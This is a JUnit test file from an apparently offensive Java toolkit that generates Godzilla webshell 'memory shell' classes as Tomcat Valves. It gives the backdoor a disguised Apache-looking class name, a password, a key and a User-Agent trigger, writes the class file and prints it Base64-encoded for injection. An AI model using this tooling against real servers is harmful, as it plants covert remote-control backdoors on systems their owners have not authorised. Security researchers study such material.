package com.reajason.javaweb.memsell.tomcat.godzilla;

import com.reajason.javaweb.memsell.GodzillaGenerator;
import com.reajason.javaweb.util.ClassUtils;
import lombok.SneakyThrows;
import net.bytebuddy.jar.asm.Opcodes;
import org.apache.commons.codec.binary.Base64;
import org.junit.jupiter.api.Test;

import java.nio.file.Files;
import java.nio.file.Paths;

import static org.junit.jupiter.api.Assertions.assertEquals;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
class GodzillaValveTest {
    String pass = "pass";
    String key = "key";
    String headerName = "User-Agent";
    String headerValue = "test";

    @Test
    void generate() {
        String className = "org.apache.utils.CommonValve";
        byte[] bytes = GodzillaGenerator.generate(GodzillaValve.class, className, pass, key, headerName, headerValue);
        Object obj = ClassUtils.newInstance(bytes);
        assertEquals(className, obj.getClass().getName());
        assertEquals(pass, ClassUtils.getFieldValue(obj, "pass"));
        assertEquals("3c6e0b8a9c15224a", ClassUtils.getFieldValue(obj, "key"));
        assertEquals(headerName, ClassUtils.getFieldValue(obj, "headerName"));
        assertEquals(headerValue, ClassUtils.getFieldValue(obj, "headerValue"));
        System.out.println(Base64.encodeBase64String(bytes));
    }

    @Test
    @SneakyThrows
    void generateJakarta() {
        String className = "org.apache.utils.CommonJakartaValve";
        byte[] bytes = GodzillaGenerator.generate(GodzillaValve.class, className, pass, key, headerName, headerValue, true, Opcodes.V11, false);
        Files.write(Paths.get(className + ".class"), bytes);
        Object obj = ClassUtils.newInstance(bytes);
        assertEquals(className, obj.getClass().getName());
        assertEquals(pass, ClassUtils.getFieldValue(obj, "pass"));
        assertEquals("3c6e0b8a9c15224a", ClassUtils.getFieldValue(obj, "key"));
        assertEquals(headerName, ClassUtils.getFieldValue(obj, "headerName"));
        assertEquals(headerValue, ClassUtils.getFieldValue(obj, "headerValue"));
        System.out.println(Base64.encodeBase64String(bytes));
    }
}